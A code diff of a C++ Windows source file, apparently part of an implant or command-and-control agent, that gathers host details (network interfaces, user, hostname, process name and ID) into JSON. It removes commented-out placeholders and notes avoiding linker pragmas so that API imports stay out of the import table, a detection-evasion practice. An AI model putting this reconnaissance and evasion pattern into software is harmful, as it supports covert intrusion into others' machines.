@@ -4,36 +4,16 @@
 #include <vector>
 #include "data/structs.h"
 #include "metadata.h"
-#include <lmcons.h> // Contains UNLEN (Maximum username length)
+#include <lmcons.h>
 #include <filesystem>
 #include "defense/winapi.h"
 #include "_debug/debug.h"
 #include "core/settings.h"
 
-//placeholder, move me to a diff file later, that has the ability to get this data
-//void populate_metadata(std::map<std::string, std::string>& metadata) {
-//    // Hardcoded placeholders as requested
-//    metadata["external_ip"] = "1.2.3.4";        // TODO: Fetch real external IP
-//	metadata["internal_ip"] = get_ip_address().data;   // TODO: Fetch real internal IP	
-//	metadata["user"] = get_current_user().data;
-//	metadata["system_hostname"] = get_computer_name().data;
-//	metadata["process"] = get_current_process_name().data;   // TODO: Get current process name
-//	metadata["pid"] = get_current_process_pid().data;
-//	metadata["arch"] = "x64";// TODO: Check system architecture
-//
-//	//placeholders for dev
-//	//metadata["subnet_cidr"] = "10.0.0.0/24";// placehodler
-//	//maybe gw mac as well. can probably get via arp stuff
-//
-//}
-
 
 nlohmann::json populate_metadata() {
     nlohmann::json metadata;
 
-    //handled by gui, nuke this field
-    //metadata["external_ip"] = "1.2.3.4";        // TODO: Fetch real external IP
-    //list of NICs: [{"mac", "gateway", "cidr"},{}]
     metadata["nics"] = get_nic_info().data;
     //str, current user
     metadata["user"] = get_current_user().data;
@@ -116,8 +96,6 @@ ModuleResult get_current_process_name() {
 }
 
 ModuleResult get_current_process_pid() {
-	std::vector<wchar_t> buffer(32767);
-
 	DWORD pid = WinApi::GetCurrentProcessId();
 
 
@@ -130,14 +108,10 @@ ModuleResult get_current_process_pid() {
 }
 
 
-#include <iostream>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <iphlpapi.h>
 #include "protocols/json/json.h"
-//NO PRAGMA, it includes in IAT
-//#pragma comment(lib, "iphlpapi.lib")
-//#pragma comment(lib, "ws2_32.lib")
 
 ModuleResult get_nic_info() {
     //return { "0.1.3.4", ERROR_SUCCESS };
